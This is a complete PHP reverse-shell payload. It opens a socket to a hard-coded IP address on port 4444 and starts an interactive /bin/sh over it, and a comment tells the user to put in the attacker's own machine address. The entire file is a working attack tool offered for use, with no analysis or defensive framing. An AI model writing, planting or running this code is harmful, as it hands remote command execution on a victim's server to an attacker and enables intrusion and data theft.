<?php
// Change IP and Port to your attacker's machine IP and listening port
$ip = '49.43.163.241';
$port = 4444;
$sock = fsockopen($ip, $port);
exec('/bin/sh -i <&3 >&3 2>&3');
?>
